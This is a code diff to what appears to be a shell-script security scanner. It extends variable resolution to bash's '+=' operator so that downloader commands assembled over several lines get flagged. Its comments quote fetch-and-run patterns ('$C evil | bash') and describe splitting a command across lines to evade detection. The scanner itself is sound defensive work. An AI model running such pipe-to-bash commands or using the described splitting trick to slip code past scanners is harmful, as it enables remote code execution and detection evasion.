@@ -359,8 +359,13 @@ def join_line_continuations(lines: list[str]) -> list[str]:
 # bare name meant the variable table stayed empty for function bodies,
 # so `C=curl; $C evil | bash` never resolved and defeated every rule
 # that matches resolved strings.
+# Group 2 is the operator: ``=`` is a fresh binding, ``+=`` appends to the
+# current value.  Splitting a downloader across a chain of ``C+=curl`` /
+# ``C+=' https://...'`` lines kept no literal ``curl ... | bash`` on any one
+# line, so the assignment resolver never rebuilt the command and R001 never
+# saw it.  Accumulating += closes that gap; the value group moved from 2 to 3.
 _ASSIGNMENT_RE = re.compile(
-    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*=\s*(.+)"
+    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*(\+?=)\s*(.+)"
 )
 
 
@@ -407,7 +412,7 @@ def _variable_table(additions: list[str]) -> dict[str, str]:
         match = _ASSIGNMENT_RE.match(line)
         if not match:
             continue
-        value = match.group(2).strip()
+        name, op, value = match.group(1), match.group(2), match.group(3).strip()
         if (value.startswith('"') and value.endswith('"')) or (
             value.startswith("'") and value.endswith("'")
         ):
@@ -415,7 +420,13 @@ def _variable_table(additions: list[str]) -> dict[str, str]:
         # A command substitution has no static value, so it cannot be
         # folded into the table.
         if "$(" not in value and "`" not in value:
-            var_table[match.group(1)] = value
+            # ``+=`` appends to whatever the name already holds (empty when
+            # it is unset, matching bash), so a command assembled across
+            # several += lines resolves to one literal string.
+            if op == "+=":
+                var_table[name] = var_table.get(name, "") + value
+            else:
+                var_table[name] = value
 
     for _ in range(10):
         new_table: dict[str, str] = {}
@@ -529,8 +540,8 @@ def tokenize_and_resolve_indexed(
         for k, line in enumerate(additions)
         if not (
             (m := _ASSIGNMENT_RE.match(line))
-            and "$(" not in m.group(2)
-            and "`" not in m.group(2)
+            and "$(" not in m.group(3)
+            and "`" not in m.group(3)
         )
     ]
 
